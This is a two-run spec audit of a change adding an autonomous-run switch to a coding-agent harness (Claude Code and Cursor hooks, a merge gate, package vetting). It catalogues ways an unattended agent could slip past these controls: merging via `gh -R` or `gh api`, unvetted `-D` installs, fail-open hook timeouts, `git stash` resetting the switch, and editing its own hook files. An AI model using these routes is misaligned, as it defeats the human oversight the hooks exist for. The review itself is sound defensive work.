# Spec audit — autonomous-run-switch (DIS-106)

## Run 1 (2026-10-20, spec-auditor)

CHANGES REQUIRED

**Questions for the author** (answer before the main session fixes the artifacts):

- **Q1. Always-on items vs AC1.** The ticket's AC1 says: "Con `KIT_AUTONOMOUS_RUN="0"`, cada hook devuelve la misma decisión que hoy para la misma entrada". The spec changes several decisions in both modes and marks them "always on": literal stripping (`grep "rm -rf"` is denied today and would pass), the rule 6 write target, `rm` in the scratchpad, `.env.example`/`.env.sample`, and the secret allowlist. Do you accept these as exceptions to AC1? If yes, AC1 in the ticket must say so.
- **Q2. Existing tests in an autonomous run.**
  - Porting note §6.3 and the plan both say "un test existente → `deny`".
  - Design D9 and the spec instead allow editing an existing test when `tasks.md` names it.
  - This also relaxes `docs/base-standards.md` §3 rules 3 and 4.
  - Which rule do you want?
- **Q3. APPROVED condition dropped.** §6.3 and the plan allow rewriting active-change artifacts only "si ese change tiene un informe `spec-audit` con veredicto `APPROVED`". D9 and the spec dropped that condition. Was that intended?
- **Q4. Who commits the new keys.** The ticket decision says the switch "se commitea como `"0"`". But task 0.3 forbids staging `.claude/sdd-harness.env`, and Migration step 2 has you add the keys only locally. So `KIT_AUTONOMOUS_RUN="0"`, `AUTONOMOUS_MERGE_BASE` and `KIT_SECRET_ALLOWLIST` never reach the tracked file. Who writes the committed version, and how? Your local copy has other local edits.
- **Q5. AC8 dry run without the profile.** AC8 requires the dry-run merge "con el perfil autónomo". Task 12.4 runs it under your normal profile, and under the autonomous profile "only if she has created it". Do you accept AC8 being met without the profile?
- **Q6. `npm audit`.** §6.3 asks "Después, `npm audit`" after a vetted install, and the ticket's scope is "toda la sección 6.3". It is neither in the change nor listed as a non-goal. Should it be included or excluded?

---

## 1. Scope against the ticket

DIS-106 has no parent. The ticket bounds the scope directly, and through "toda la sección 6.3" also §6.3/§6.5 of the porting note.

Additions that do not follow literally from the ticket. All are defensible, but you should confirm or cut them:
- **Merge command form**, improvable. The spec allows only `--merge` and forbids `--admin`/`--auto`/`--squash`/`--rebase` and chaining. The ticket's AC3 lists five conditions without these. It derives from §6.3 "el método de merge es el fijado" and line 998, so it is acceptable. Add it to the ticket's AC3.
- **Whole-tree staging denied** (`git add -A`, `commit -a`), improvable. Not in the ticket. It derives from protecting `.claude/`. Keep it and add it to the ticket's scope.
- **`.env.sample`, and editing (not only reading) the example files**, improvable. The ticket says "`.env.example` legible". §6.2 #5 says "legible y editable", and the plan adds `.env.sample`. Acceptable; record it in the ticket's scope.
- **`.claude/autonomous-denials.log` location.** The ticket gives no location; §6.3 says `reports/autonomous-denials.log`. Acceptable as a design choice.
- **Naming drift, improvable.** The ticket names `vet-package.sh`; design D3 uses `vet-package.mjs`. Update the ticket.

Missing from "toda la sección 6.3": the `npm audit` step (Q6), and several §6.5 preflight points (see point 2).

## 2. Inherited acceptance criteria (the ticket's own ACs; there is no parent)

| AC | Requirement / scenario | State |
|---|---|---|
| 1 | "The autonomous run is a manual switch…" → "With the switch off the hooks keep their decisions" | Partial. Only the six `ask` inputs are pinned; the deny and no-decision paths are not. The always-on items contradict the literal AC (Q1). **Blocking** until Q1 is answered. |
| 2 | "No hook leaves a confirmation pending…" | Covered. |
| 3 | "The agent merges only under deterministic conditions" | Covered, but how a merge command is detected is open (point 5, B5). |
| 4 | "Dependency installs are vetted automatically…" | Covered, but `--save-dev`/`-D` installs bypass vetting (point 8, B8). **Blocking.** |
| 5 | "Example environment files are readable and editable" | Covered. |
| 6 | "Cursor runs the same hooks…" | Covered, but contradicted by D11 (point 6). |
| 7 | "A preflight checks the autonomous setup…" | Partial. Points from §6.5 are missing: ask rules at project scope (`.claude/settings.json`, `.claude/settings.local.json`), "protecciones de secretos activas", hooks executable, Git Bash on Windows. Project-scope ask rules reproduce incident #4, so that one is **blocking**; the rest are improvable. PowerShell is exercised only manually in 12.6. |
| 8 | Manual (task 12.4) | Conditional on the profile (Q5). **Blocking** until answered. |

## 3. Missing scenarios (all improvable unless marked)

- "Rewrites of specs, tests and doctrine…", bullet 3 ("any other existing file under `openspec/` other than `tasks.md` and `reports/`: `deny`") has no scenario. Add one: an edit of an artifact of another, non-active change is denied.
- "Rewrites…", migration bullet: the reason "asks for a new migration" is not asserted. Extend the "Doctrine and versioned migrations" scenario.
- "The shell guard ignores text…": the write targets `tee`, `mv`/`cp` destination, `truncate` and `dd of=` have no scenario. Only `>>` and `sed -i` do.
- "Removals inside the session scratchpad…": the `rmdir` case and the case without `scratchpad_dir` have no scenario. Task 3.3 tests the latter; name it in the spec.
- "The agent merges…":
  - no scenario for the current-branch selector (no number);
  - no scenario for `mergeable: UNKNOWN`;
  - no scenario for short flags (see B5).
- "Denials … are logged locally": "Logging SHALL never block the session" and "ignored by git" have no scenario. Add: an unwritable log path still exits 0.
- "A preflight…": no scenario for the empty merge base, the missing auto-mode authorisation, unregistered hooks, a missing `.cursor/hooks.json`, `gh` not authenticated, or a red base CI.
- "Cursor runs the same hooks…": no scenario for `stop` (only an unnamed test in 9.2).

## 4. Ambiguity

None of fast/easy/secure/efficient/many/appropriate/robust appears in the change. "Known test sentinels" (spec title) and "narrow allows" (D12) are defined by the allowlist and the explicit list. Clean.

Two wording issues:
- **Blocking.** Scenario "A complete setup passes": "every check line is `OK`" cannot hold when warning-only checks (Docker, Defender) or the existing doctor's normal WARN lines appear. Reword to "no line is `FAIL` and the exit code is `0`".
- **Improvable.** "every permission denial reported to the kit": say "every `PermissionDenied` event".

## 5. Open decisions (each blocking)

- **B1. No determinable active change** ("Rewrites…"). When `active_change()` returns nothing (no match and several active changes; `spec-audit-gate.sh:45-48` then lets the edit pass), the autonomous decision for artifacts, main specs and tests is undefined. Fix in the requirement: e.g. "when the branch's active change cannot be determined, every bullet that depends on it decides `deny` with a reason naming the branch".
- **B2. Repository-relative path for the `tasks.md` test check** (D9). Claude Code sends absolute `file_path` (`C:\…` on Windows); `PROJECT_DIR` may be `C:/…` or `/c/…`. Fix in D9: how the path is reduced (normalise slashes and drive forms, strip `$PROJECT_DIR/`). Add a scenario with an absolute Windows path.
- **B3. A version that does not exist.** An existing package whose requested version does not exist: `versions[x.y.z]` is absent. Add the check "the requested version exists in the registry" to the requirement, and a case to the "fails a check" scenario.
- **B4. `KIT_SECRET_ALLOWLIST` edge cases.** Behaviour with an invalid ERE is undefined. Fix in the requirement: an invalid allowlist is ignored and the prompt is scanned unchanged. Also state that the `load_env_safe` rejection of `${` / `$(` applies, so a regex containing those is dropped.
- **B5. What counts as a merge command.**
  - D4 exits when the raw command "does not contain `gh pr merge`". So `gh -R owner/repo pr merge 61 --merge`, `gh --repo … pr merge`, `GH_REPO=… gh pr merge` and `gh api -X PUT repos/…/pulls/61/merge` bypass the gate.
  - The other way round, a commit message that mentions `gh pr merge` would be denied as "not alone".
  - Short flags are not covered: `-m`, `-s`, `-r`, `-d`, `--delete-branch`, `--body`, `--subject`.
  - Fix in the requirement and in D4: detection runs on `strip_literals()` text with a token-level regex that admits global flags (`-R`, `--repo`); `gh api` calls to `/pulls/<n>/merge` are denied in an autonomous run; `-s`/`-r` are denied like their long forms, `-m` equals `--merge`; state whether `-d`/`--delete-branch` is allowed.
- **B6. Hook time budget (fail-open).**
  - `settings.json:73` gives `block-dangerous-bash` a **10 s** timeout. D3 gives each network call 10 s, with two calls per package, sequential, across several packages.
  - A hook timeout in Claude Code, or "any other failure" in Cursor (design line 35), lets the call pass. So a slow registry means an unvetted install.
  - The merge gate's timeout is not set at all.
  - A Node crash or non-JSON output from `vet-package.mjs` is not specified as `deny`.
  - Fix in D3/D4: a total vetting budget below the hook timeout (e.g. calls in parallel, 4 s each, ≤ 8 s total) or a raised `timeout` for the Bash hooks in `settings.json` and `.cursor/hooks.json`; an explicit merge-gate timeout; "missing or unparsable vetting output → `deny`". Add a scenario: a registry that answers after the budget → `deny`.
- **B7. `gh pr view --json files` is capped.** The GitHub CLI fetches the files of a PR with a page limit (100). A PR above it can hide a `.claude/` path, or the archive path. Fix in D4: also read `changedFiles`, and deny when `files` has fewer entries than `changedFiles` (or use `gh pr diff --name-only`). Verify the limit with Context7 in task 6.2.
- **B8. Install detection.** `block-dangerous-bash.sh:36` matches `install[[:space:]]+[^-]`, so `npm install --save-dev left-pad@1.3.0`, the spec's own allow scenario, does **not** trigger rule 5 today. Neither do `npm i -D x` or `pnpm add -D x`. In an autonomous run those installs would skip vetting. Decide whether the new detection (flags before names) is autonomous-only, or always on and therefore a change to the switch-off `ask` set (affects AC1). Write it in the requirement, and add a scenario `npm i -D unknown-pkg@1.0.0` → `deny`.
- **B9. Doctor's profile and output.**
  - Where `doctor --autonomous` reads the profile path from (`CLAUDE_CONFIG_DIR` of the calling shell? a `--profile` argument?), and what happens when it is unset.
  - `doctor.sh:9-11` treats `$1` as the destination, so `--autonomous` as the first argument becomes `cd --autonomous` and fails under `set -e`. D13 must define the argument parser (order-independent `--dest`/`--autonomous`).
  - Whether the existing checks' FAIL lines count toward the autonomous exit code.
- **B10. Scratchpad removal: allow or no decision?** The requirement says "SHALL be allowed by the shell guard"; its scenario and proposal line 13 say "returns no decision". Pick one; no decision is recommended, so the hook does not override the classifier or ask rules. Make the requirement, scenario and D7 match.

## 6. Contradictions inside the change

- **Blocking. D11 vs the Cursor requirement.**
  - The requirement says "for the same situation, a hook run for Cursor SHALL take the same decision as for Claude Code".
  - D11, and the unnamed test in 9.2, turn `ask` into `deny` for `preToolUse`/`beforeReadFile` *outside* an autonomous run. An interactive Cursor user could then never edit an existing test or artifact.
  - Either verify in 9.1 whether `preToolUse` accepts `ask` (Cursor docs) and keep `ask`, or write the exception into the requirement explicitly.
- **Blocking. D11 vs the requirement on `stop`.**
  - The requirement says "a stop that would block as a `followup_message`". But `verify-tests.sh:27` uses `block`, and D11 maps `block` to stderr (exit 0) and only `notify`/`inject` to `followup_message`.
  - Mapping the green-suite `notify` to `followup_message` would also make Cursor submit a new agent turn on every green stop: a loop.
  - Cursor sends no `stop_hook_active` (`verify-tests.sh:9`).
  - Fix D11: on `stop`, `block` → `followup_message`, `notify` → nothing; loop guard on Cursor's `loop_count`.
- **Improvable. D10 vs the design's own facts.** D10 logs `classifier_verdict`, but Context lists only `tool_name`, `tool_input`, `reason` for `PermissionDenied`. Drop the field or mark it "when present".
- **Improvable. D6.** "Rule 6 and rule 8 use … their own write-target parsing": rule 8 is not a write rule. Reword.
- **Improvable. Task 12.2.** "`rm -f` on a file in this session's scratchpad passes": your personal `rm *` ask rule will prompt anyway. Say "the hook returns no decision (a prompt from the personal ask rule is expected and recorded)".

## 7. Contradictions with the project

- **Blocking. Doctrine on merges.**
  - `docs/base-standards.md` §3 rule 9: "`git push --force` and merges are signed by a human."
  - `docs/openspec-tasks-mandatory-steps.md` §3 Pre-merge Review, item 5: "The author merges after the archive commit. The agent never merges."
  - The earlier ADR `docs/adr/20261016-autonomous-workflow-run-entrega-2.md` relaxed §99, §88, §90 and the "why" rule "For this run only" and states "Every rule above returns to its normal form after this run".
  - This change makes those relaxations permanent whenever the switch is on, yet the planned ADR (D16: D1, D2, D4, D11, D12) records none of them and does not reference or partially supersede the 2026-10-16 ADR.
  - Doctrine is kit-owned and protected, so it must not be edited. The exception goes in the new ADR (relation to 20261016, list of the rules relaxed when `KIT_AUTONOMOUS_RUN="1"`), in the `docs/project-context.md` "local patch" note (13.3), in `docs/AUTONOMOUS-RUN.md` (13.1) and in `.cursor/rules/20-openspec.mdc` (9.4).
- **Improvable. Rule 8 ("The 'why' is not written by the AI").** D16 writes it by your decision ([original]: "El ¿Por que? lo escribirás tú"). The ADR and the PR must mark it as the agent's text written at your request, as the 2026-10-16 ADR did.
- **Improvable. Q2 relaxes base-standards rules 3 and 4.** Whichever answer you give goes into the same ADR.
- No overlap with any main spec in `openspec/specs/`; `agent-harness` is a new capability. Clean.

## 8. Contrast with the real code

- **Blocking.** `.claude/hooks/session-context.sh:9` exits unless `.source` is `startup` or `resume`. Cursor's `sessionStart` input has no such field, so D11's `inject` → `additional_context` mapping is never reached, and the autonomous warning never shows in Cursor. D11 must map the input, e.g. Cursor `sessionStart` counts as `startup`.
- **Blocking. Stash and restore can flip the switch** (the commands D5/rule 8 leave unblocked).
  - `git stash`, `git restore .` and `git checkout -- .` without paths revert your local `.claude/sdd-harness.env`, turning the switch back to `"0"` mid-run. The hooks then `ask` again: the incident #3 stall.
  - D2 even suggests `git stash` as the alternative to `reset --hard`.
  - Fix: rule 8 also denies pathless `git stash` (push/save), `git restore .`/`:/`, and `git checkout -- .`/`.`. Change D2's alternative to `git stash push -- <paths>` / `git restore -- <paths>`.
  - Add `git add -u`/`--update` and `git commit .` to the whole-tree list (improvable; the merge gate is the backstop).
- **Improvable.**
  - `protect-specs-and-tests.sh:45` exempts `openspec/templates/*`, but the autonomous table would deny those files. Keep the exemption in the table.
  - `doctor.sh:115` checks `grep -q 'sdd-harness\.env) return 1'`. If D8 merges the `.env.example` exception into the same `case` arm, that check fails. D8 must say "separate case arm before the secret patterns".
  - `doctor.sh:51` (HOOKS list) should gain `autonomous-merge-gate` and `log-permission-denied` (and `spec-audit-gate`, which is already missing).
  - D9 cites `spec-audit-gate.sh` lines 26–45; the detection is at lines 25–48.
  - `.claude/sync-artifacts.sh:75-78` reports `DIVERGES` for copies unless `--force`. Task 8.2/10.4 should say "`/sync-agent-artifacts` (with `--force` in copy mode)".
  - `lib.sh:119` `ask()` exits 0 without jq. In an autonomous run that gives no decision; D2 should go through `deny()`, which exits 2 without jq.
  - The CI `mutation` job's filter includes `tests/**` (`ci.yml:87`). Check that Stryker's dry run does not pick up `tests/harness` (bash process spawns), or exclude it in `vitest.stryker.config.*`.
- No duplicated abstraction: `active_change()` and `SECRET_PATTERNS` are extracted, not duplicated. Clean.

## 9. Task size (improvable)

- **9.3** (invoke.cjs flag, input helper, all six emitters for Cursor, hooks.json): split into 9.3a input adapter + invoke.cjs, 9.3b emitters, 9.3c hooks.json.
- **10.4** (doctor.sh + doctor.ps1 + kit-health + sync): split the PowerShell doctor into its own task.
- **13.1** (a full Spanish guide with seven sections, both shells): split into two tasks (setup/profile/preflight; workflow contract/Cursor/closing).
- **2.1.** The Cursor background-agent test stays red from task 2 to 9.3, and the Stop hook runs the suite every turn. Mark it `it.todo`/skip until 9.3, or move it to 9.2.

## 10. Mandatory steps

- Step 0 is first and creates the branch, with `feature/`. 0.1 (Linear first) precedes it, per your rule. OK.
- Review/Run Tests (11) and Manual Interface Testing (12) are labelled `(MANDATORY)` / `AGENT MUST EXECUTE`. The report path follows the pattern. OK.
- Restoration is present in 12.3, 12.4 and 12.7. Pre-merge Review is last, with archive before merge and the author merging. OK.
- End-to-end is not applicable (no UI). Improvable: state that explicitly.
- Improvable: add `openspec validate autonomous-run-switch --strict` to 11.2. The delta carries a `## Purpose` section; check that archive accepts it.
- Improvable: 12.4 must say that you set `AUTONOMOUS_MERGE_BASE="tmp/autonomous-dry-run"` by hand and restore it afterwards. Otherwise the gate denies the base, and that is not part of the listed restorations.

## 11. Traceability

| Requirement | Scenarios | Tasks |
|---|---|---|
| Manual switch, default intact | 3 | 0.4, 2.1, 2.2, 9.3 |
| No pending ask | 4 | 2.3, 2.4 |
| Vetted installs | 5 | 4.1, 4.2 |
| Rewrites of specs/tests/doctrine | 6 (bullet 3 has none, point 3) | 5.1, 5.2 |
| Deterministic merge | 5 | 6.1, 6.2, 12.4 |
| Kit config out of commits | 3 | 3.4 |
| Shell guard ignores literals | 4 | 3.1, 3.2 |
| Scratchpad removals | 2 | 3.3 |
| Example env files | 2 | 5.3, 5.4 |
| Secret allowlist | 2 | 7.1 |
| Denial log | 3 | 7.2 |
| Cursor parity | 4 | 9.1–9.4, 12.5 |
| Preflight | 3 | 10.3, 10.4, 12.6 |
| Review skills inline | 2 | 8.1, 8.2 |

Every row has a scenario and a task. Holes inside rows are listed in point 3. AC8 maps only to 12.4 (Q5).

---

## Corrections to apply

**`specs/agent-harness/spec.md`**
- "Dependency installs…": add "the requested version exists" to the check list (B3). Define detection so it covers flags before package names (`-D`, `--save-dev`, `-w <ws>`), and say whether that is autonomous-only or always on (B8). Add: "a check that does not finish within the budget, or whose output cannot be read, SHALL deny" (B6). Add scenarios `npm i -D unknown@1.0.0` → `deny`, existing package with a missing version → `deny`, slow registry → `deny`.
- "Rewrites…": add "When the branch's active change cannot be determined, … `deny`" (B1); exempt `openspec/templates/`; add a scenario for bullet 3. After Q2/Q3, adjust the test bullet and the artifact bullet (APPROVED report?).
- "The agent merges…":
  - add a detection clause (B5): "A command runs `gh pr merge` when, after ignoring quoted text and heredocs, it invokes `gh` with the `pr merge` subcommand, whatever global flags (`-R`, `--repo`) precede it; a `gh api` call to `/pulls/<n>/merge` SHALL be denied in an autonomous run";
  - extend the flags: "`-m` is `--merge`; `-s`, `-r` are denied like `--squash`, `--rebase`; `--delete-branch` is <allowed|denied>";
  - add "when GitHub returns fewer files than `changedFiles`, deny" (B7);
  - add scenarios: `gh -R o/r pr merge 61 --merge` is gated; `git commit -m "gh pr merge"` is not gated; `mergeable: UNKNOWN` → `deny`.
- "The kit configuration stays out…": add pathless `git stash`, `git restore .`, `git checkout -- .`, `git add -u`, `git commit .`, with a scenario: `git stash` → `deny` naming `git stash push -- <paths>`.
- "Removals inside the scratchpad": replace "SHALL be allowed by the shell guard" with "the shell guard SHALL return no decision" (B10). Add an `rmdir` scenario and a "no `scratchpad_dir`" scenario.
- "Known test sentinels…": add "An invalid `KIT_SECRET_ALLOWLIST` SHALL be ignored and the prompt scanned unchanged" (B4).
- "Denials … logged": "every `PermissionDenied` event"; add the scenario "an unwritable log still exits 0 and does not block".
- "Cursor runs the same hooks…":
  - state the `preToolUse`/`beforeReadFile` behaviour outside an autonomous run (keep `ask` if Cursor accepts it, or write the exception);
  - add "a `stop` with a red suite → `followup_message`; a green suite → no output; no follow-up when `loop_count` > 0";
  - add a `sessionStart` scenario with the autonomous warning.
- "A preflight…":
  - add checks: no `permissions.ask` in `.claude/settings.json` or `.claude/settings.local.json`; the secret protections active; the new hooks executable; on Windows, Git Bash found;
  - define where the profile path comes from and that an unset value is `FAIL` (B9);
  - reword the "complete setup" scenario to "no `FAIL` line, exit code `0`".

**`design.md`**
- D2: change the alternative to `git stash push -- <paths>` / `git restore -- <paths>`, and route `ask()` in an autonomous run through `deny()` (works without jq).
- D3: total time budget below the Bash hook `timeout`, or raise that `timeout` in `settings.json` and `.cursor/hooks.json` (e.g. 30 s); missing or unparsable output → `deny`; the version-exists check.
- D4: detection on stripped text with global flags; `gh api …/merge` denied; short flags; `changedFiles` vs `files`; explicit hook timeout.
- D5: add the pathless `stash`/`restore`/`checkout` forms and `add -u`/`commit .`, with the reason (protecting the local switch).
- D6: fix the "rule 8 write-target" wording.
- D7: "no decision".
- D8: "separate `case` arm, so `doctor.sh:115` keeps matching".
- D9: fix the line reference (25–48); rule for an undeterminable change (B1); absolute → repo-relative normalisation (B2); `openspec/templates/` exempt.
- D10: drop `classifier_verdict` or mark it optional.
- D11: `sessionStart` input mapping (no `.source`); `stop` mapping (`block` → `followup_message`, `notify` → none, `loop_count` guard); the `ask` decision for `preToolUse` pending 9.1, and no spec deviation without updating the requirement.
- D13: argument parser for `doctor.sh` (`--dest`/`--autonomous` in any order); profile path source; exit code semantics; HOOKS list update.
- D16: the ADR also records the doctrine relaxations active when `KIT_AUTONOMOUS_RUN="1"` (base-standards §88, §90, §99, rule 8; mandatory-steps §3 item 5) and its relation to `20261016-autonomous-workflow-run-entrega-2.md` (that record was "for this run only").

**`tasks.md`**
- 2.1: mark the Cursor background-agent test `it.todo` until 9.3.
- 3.4: add the stash/restore/checkout whole-tree cases.
- 4.1: add the `-D` install, missing-version and slow-registry cases.
- 6.1: add the `-R`, quoted-text, `UNKNOWN`, short-flag and files-truncation cases; 6.2 sets the hook timeout.
- 8.2 / 10.4: `/sync-agent-artifacts` with `--force` in copy mode.
- Split 9.3, 10.4 and 13.1 as in point 9.
- 10.4: update the `doctor.sh` HOOKS list.
- 11.2: add `openspec validate autonomous-run-switch --strict`; check Stryker does not run `tests/harness`.
- 12.2: wording about your personal ask rule.
- 12.4: you set `AUTONOMOUS_MERGE_BASE` to the throwaway base by hand and restore it afterwards; resolve Q5.
- 13.2 / 13.3 / 9.4: record the doctrine exceptions (point 7).
- Add a task for Q4 (how the tracked `sdd-harness.env` gets the new keys at `"0"`).
- State "End-to-End Testing: not applicable (no UI)".

**`proposal.md`**
- Line 13: "rm inside the session scratchpad is not blocked by the shell guard".
- Impact: add `docs/adr/20261016-…` (referenced or partially superseded) and the doctrine-exception note.

**Linear DIS-106** (Enhanced part only; the `[original]` block is not touched; in Spanish)
- In "Criterios de aceptación" 1, add: «Excepciones siempre activas (en los dos modos): ignorar heredocs y cadenas entre comillas, la regla de `sdd-harness.env` solo como destino de escritura, `rm` dentro del scratchpad, `.env.example`/`.env.sample` legibles y editables, y la allowlist de secretos.» (only if Q1 is answered yes)
- In "Criterios de aceptación" 3, add: «El comando es `gh pr merge` solo, con `--merge` y sin `--admin`, `--auto`, `--squash` ni `--rebase`; se reconoce también con `-R`/`--repo`; `gh api …/merge` se deniega.»
- In "Alcance" 2, add: «Con el interruptor activo también se deniegan `git add -A|--all|.|-u`, `git commit -a`, y `git stash`/`git restore .` sin rutas (protegen el interruptor local).»
- In "Alcance" 3: «`vet-package.mjs` (Node) en lugar de `vet-package.sh`.»
- In "Alcance" 6, add: «El ADR recoge las reglas de `base-standards.md` (§88, §90, §99 y la regla 8) y de `openspec-tasks-mandatory-steps.md` §3 que se relajan con el interruptor activo, y su relación con el ADR `20261016-autonomous-workflow-run-entrega-2`.»
- After Q2, Q3, Q4, Q5 and Q6: record each answer as a bullet under «Decisiones de la autora».

Relevant paths:
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\openspec\changes\autonomous-run-switch\{proposal.md,design.md,tasks.md,specs\agent-harness\spec.md}
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\.claude\hooks\{block-dangerous-bash.sh,session-context.sh,verify-tests.sh,protect-specs-and-tests.sh,spec-audit-gate.sh,lib.sh}
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\.claude\settings.json
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\.claude\doctor.sh
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\docs\base-standards.md
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\docs\openspec-tasks-mandatory-steps.md
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\docs\adr\20261016-autonomous-workflow-run-entrega-2.md

### Resolution of run 1 (main session, 2026-10-20)

Author's answers (recorded in DIS-106 Enhanced → «Respuestas a la auditoría de la spec»):
- Q1 — accepted as always-on exceptions; the requirement lists them, and so does the ticket's AC1.
- Q2 — planned test edits are allowed (`tasks.md` names the test); recorded as a doctrine relaxation in D9/D16.
- Q3 — **APPROVED required**: active-change artifacts and main-spec syncs are rewritten in an autonomous run only when the spec-audit report ends in `APPROVED`. Consequence documented in D9: a `CHANGES REQUIRED` audit that needs rewrites stops the ticket cleanly.
- Q4 — the author reverted her local edits of the kit contract file; the change adds and commits the keys (D18, task 2.2).
- Q5 — the author creates the autonomous profile before step 12; the dry run runs under it (task 12.4).
- Q6 — `npm audit --audit-level=high` is a workflow-contract rule (D19), not a hook.

Findings:
- Point 1 (scope additions): fixed — merge command form, whole-tree staging and pathless reverts, `.env.sample` and editing, and `vet-package.mjs` are in the ticket.
- Point 2 AC1: fixed (Q1, and a new scenario «With the switch off denials and silences are unchanged»). AC7 (project-scope ask rules, secret protections, hook files, Git Bash): fixed in the preflight requirement and D13. AC8: Q5.
- Point 3 (missing scenarios): fixed. Added scenarios for:
  - another change's artifact;
  - the migration reason;
  - all write targets;
  - `rmdir` and no `scratchpad_dir`;
  - the current-branch selector (unnamed test, 6.1);
  - `UNKNOWN`, short flags, `-R`, `gh api`, text mention;
  - an unwritable log;
  - the preflight cases;
  - Cursor `stop` and `sessionStart`.
- Point 4: fixed — «A complete setup passes» reworded; «every `PermissionDenied` event».
- B1 fixed (undeterminable change → deny). B2 fixed (path normalisation D9 + absolute Windows path scenario). B3 fixed (version exists). B4 fixed (invalid allowlist ignored; `load_env_safe` rule stated). B5 fixed (detection on stripped text, global flags, `gh api`, short flags, `-d` denied). B6 fixed (8 s total budget, hook timeouts 30 s, unreadable output → deny, slow-registry scenario). B7 fixed (`changedFiles` vs `files`; limit checked in 6.2). B8 fixed (tokenised detection, always on, listed in AC1 exceptions, `npm i -D` scenario). B9 fixed (D13 parser, `--profile`, exit semantics). B10 fixed (no decision everywhere).
- Point 6:
  - D11 vs Cursor: fixed. The `ask` exception is written into the requirement (allow plus warning outside an autonomous run), and task 9.1 re-checks it against the docs.
  - `stop` mapping: fixed (`block` → follow-up, green → nothing, `loop_count` guard).
  - D10 `classifier_verdict`: fixed (marked "when present").
  - D6 wording: fixed.
  - 12.2 wording: fixed.
- Point 7: fixed. D16 lists the doctrine relaxed while the switch is on and the relation to the 2026-10-16 ADR, and marks the «why» as the agent's text. Tasks 9.5, 13.1, 13.3 and 13.4 carry it; doctrine files are not edited.
- Point 8:
  - `session-context` under Cursor: fixed (D11, task 9.3).
  - Pathless stash/restore: fixed (D5, spec, D2 alternatives).
  - `openspec/templates/`: fixed (exempt).
  - `doctor.sh:115`: fixed (separate case arm, D8; checked in 5.3).
  - `HOOKS` list: fixed (D13, 10.4).
  - D9 line numbers: fixed.
  - Sync `--force`: fixed (D14, 8.2).
  - `ask()` without jq: fixed (D2, test in 2.3).
  - Stryker and `tests/harness`: fixed (D15, 11.2).
- Point 9: fixed — 9.3 split into 9.3/9.4, 10.4 into 10.4/10.5, 13.1 into 13.1/13.2; the Cursor background test is `it.todo` until 9.4.
- Point 10: fixed — End-to-End stated as not applicable (11.4); `openspec validate --strict` in 11.2; 12.4 sets and restores `AUTONOMOUS_MERGE_BASE`.

Next: run 2 of the auditor.

## Run 2 (2026-10-20, spec-auditor)

CHANGES REQUIRED

## Spec audit — autonomous-run-switch (DIS-106), run 2 (2026-10-20)

The verdict is CHANGES REQUIRED. Most of run 1's fixes are in place, but the new text has 13 blocking findings. Three of them need an answer from the author before the artifacts can be fixed.

**Questions for the author** (answer before the main session fixes the artifacts):

- **QA. Cursor background agents and the merge.**
  - The spec says an autonomous run is in effect when the switch is `"1"` **or** for a Cursor background agent (`is_background_agent`), even when the switch is `"0"`.
  - D18 now commits `AUTONOMOUS_MERGE_BASE="final-project-CRN"`, so the "base is empty → deny" safety is gone.
  - Result: any Cursor background agent can merge into `final-project-CRN` through the gate without you turning the switch on.
  - Yet proposal line 20 and D16 say the doctrine is relaxed "while `KIT_AUTONOMOUS_RUN="1"`, and only then".
  - Which do you want?
    - (a) Keep it, and reword D16, the proposal, the ADR and the guide to say "while an autonomous run is in effect (switch `"1"` or a Cursor background agent)".
    - (b) Background agents get the no-`ask` behaviour, but the merge gate (and rule 8) require the switch `"1"`.
    - (c) Commit `AUTONOMOUS_MERGE_BASE=""` and set it by hand for a run.
- **QB. Who writes the "why" in an autonomous run** (base-standards §3 rule 8)?
  - Proposal line 20 says the human-written "why" **is relaxed** while the switch is on.
  - D16 says rule 8 sees "no change", and only this ADR's own "why" is the agent's.
  - An unattended run opens PRs, and may write ADRs, with nobody to write a "why". The 2026-10-16 ADR let the agent write it, marked as the agent's text.
  - Which rule should the workflow contract (13.2, `20-openspec.mdc`) state?
- **QC. Editing `.claude/` and `.cursor/` files with Edit/Write in an autonomous run.**
  - The ticket limits the protection to *git* operations on `.claude/` and `.cursor/`.
  - Nothing stops an autonomous agent from editing `.claude/hooks/autonomous-merge-gate.sh` or `lib.sh` (they take effect on the next call), or `.cursor/hooks.json`, with the Edit tool or a shell `sed -i`.
  - That neutralises the merge gate locally. Rule 8 stops the edit from being committed, but not from running.
  - In Cursor there is no classifier behind it.
  - Proposed: add a row to the autonomous table, "a file under `.claude/` or `.cursor/`: `deny`" (Edit/Write and Cursor Write/Delete), and extend rule 6's write-target parsing to those paths.
  - This widens the ticket's scope, so it is your call.

Not re-raised (your decisions): Q1–Q6 of run 1. Q3 (APPROVED required) is accepted with its consequence.

---

## Verification of run 1's resolution

| Run 1 item | Claimed | Verified |
|---|---|---|
| Point 1 (scope additions in the ticket) | fixed | Yes: AC3, Alcance 2, `vet-package.mjs` are in the Enhanced part |
| AC1 exceptions / new switch-off scenario | fixed | Yes (spec lines 11–17, 31–33; ticket AC1). D8 adds a new, undeclared exception (B-6) |
| AC7 preflight points | fixed | Yes in the requirement and D13. Scenarios only partly (point 3) |
| AC8 under the profile | fixed | Yes (12.4) |
| Point 3 scenarios | fixed | Mostly. The write-target scenario lacks `mv` and `perl -i`; preflight cases for `gh`, red CI, `.cursor/hooks.json` and Git Bash are missing |
| Point 4 wording | fixed | Yes |
| B1–B4, B6, B7, B9, B10 | fixed | Yes |
| B5 merge detection | fixed | Partly: newline/`&` chaining, `cwd` and `GH_REPO` remain (B-3, B-4) |
| B8 install detection | fixed | Yes, but the list of flags that take a value is incomplete (improvable) |
| Point 6 (D11 vs Cursor, `stop`, D10, D6, 12.2) | fixed | Yes. A new contradiction appeared: proposal vs D16 on rule 8 (B-10) |
| Point 7 (doctrine in the ADR) | fixed | Yes, but D16's rule numbering is mixed (improvable) and contradicts the proposal (B-10) |
| Point 8 items | fixed | Yes. The jq fix is unreachable in practice (B-8). D8 introduced B-6 |
| Points 9, 10 | fixed | Yes |

---

## 1. Scope against the ticket

DIS-106 has no parent. Everything in the change follows from the ticket's Enhanced part and the recorded answers.

- **Possible widening, QC (blocking until answered).** Edit-tool protection of `.claude/` and `.cursor/` would go beyond the ticket's "operaciones git".
